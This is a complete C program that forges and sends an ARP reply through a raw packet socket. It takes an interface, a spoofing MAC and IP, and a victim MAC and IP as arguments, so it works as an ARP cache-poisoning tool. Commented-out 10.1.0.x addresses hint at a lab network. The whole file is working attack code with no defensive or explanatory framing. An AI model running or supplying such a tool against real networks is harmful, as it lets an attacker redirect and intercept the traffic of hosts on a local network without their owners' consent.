#include <linux/if_ether.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

typedef struct ether_header ether_header;
typedef struct ether_arp ether_arp;
typedef struct sockaddr_ll sockaddr_ll;
typedef struct sockaddr sockaddr;
typedef struct ether_addr ether_addr;

#define IPV4LEN 4

	
int main(int argc,char** argv) {
	if(argc!=6) {
		printf("Usage %s interface spoofing-mac spoofed-ip victim-mac victim-ip\n"
				,argv[0]);
		printf("mac format = colon separated hex\n");
		printf("ip format = dotted decimal\n");
		exit(-1);
	}

	ether_header* eth = (ether_header*)(malloc(sizeof(
					ether_header) +sizeof(
						ether_arp)));
	
	if(eth==NULL) {
		printf("Memory allocation Failed\n");
		exit(-1);
	}



	//{0x02,0x42,0x0a,0x01,0x00,0x65};
	ether_addr* source = ether_aton(argv[2]);
	if(source==NULL) {
		printf("spoofing-mac %s is invalid\n",argv[2]);
		exit(-1);
	}
	uint8_t source_mac[ETH_ALEN]; 	
	memcpy(source_mac,source->ether_addr_octet,ETH_ALEN);
	//for(int i=0;i<ETH_ALEN;i++) 
	//	printf("%x:",source_mac[i]);
	//printf("\n");

	//{0x02,0x42,0x0a,0x01,0x00,0x69};
	ether_addr* destination = ether_aton(argv[4]);
	if(destination==NULL) {
		printf("victim-mac %s is invalid\n",argv[2]);
		exit(-1);
	}
	uint8_t dest_mac[ETH_ALEN]; 	
	memcpy(dest_mac,destination->ether_addr_octet,ETH_ALEN);
	//for(int i=0;i<ETH_ALEN;i++) 
	//	printf("%x:",source_mac[i]);
	//printf("\n");
	
	uint8_t source_ip[IPV4LEN]; //= {10,1,0,106};
	if(inet_pton(AF_INET,argv[3],source_ip)!=1) {
		printf("ip %s is not valid\n",argv[3]);
		exit(-1);
	}
	
	uint8_t dest_ip[IPV4LEN]; //= {10,1,0,105};
	if(inet_pton(AF_INET,argv[5],dest_ip)!=1) {
		printf("ip %s is not valid\n",argv[5]);
		exit(-1);
	}
	
	for(int i=0;i<IPV4LEN;i++) printf("%x.",source_ip[i]);
	printf("\n");


	for(int i=0;i<IPV4LEN;i++) printf("%x.",dest_ip[i]);
	printf("\n");



	memcpy(eth->ether_shost,source_mac,ETH_ALEN);
	memcpy(eth->ether_dhost,dest_mac,ETH_ALEN);

	eth->ether_type = htons(ETHERTYPE_ARP);

	ether_arp*  arp = (ether_arp*)(eth+1);
	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp->ea_hdr.ar_pro = htons(ETH_P_IP);
	arp->ea_hdr.ar_hln = ETH_ALEN;
	arp->ea_hdr.ar_pln = IPV4LEN;
	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

	memcpy(arp->arp_sha,source_mac,ETH_ALEN);
	memcpy(arp->arp_tha,dest_mac,ETH_ALEN);

	memcpy(arp->arp_spa,source_ip,IPV4LEN);
	memcpy(arp->arp_tpa,dest_ip,IPV4LEN);

	uint32_t interface_index = if_nametoindex(argv[1]);
	if(interface_index==0) {
		printf("%s is not a valid interface\n",argv[1]);
		exit(-1);
	}

	int fd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP));
	if(fd<0) {
		close(fd);
		printf("Couldn't open socket\n");
		exit(-1);
	}

	sockaddr_ll device;
	memset(&device,0,sizeof(device));
	device.sll_family = AF_PACKET;
	memcpy(device.sll_addr,dest_mac,ETH_ALEN);
	device.sll_halen = htons(ETH_ALEN);
	device.sll_ifindex = interface_index;
	device.sll_protocol = htons(ETH_P_ARP);

	sendto(fd,(void*)(eth),sizeof(ether_header) + 
			sizeof(ether_arp),0, 
			(sockaddr*)&device,sizeof(device));	


}

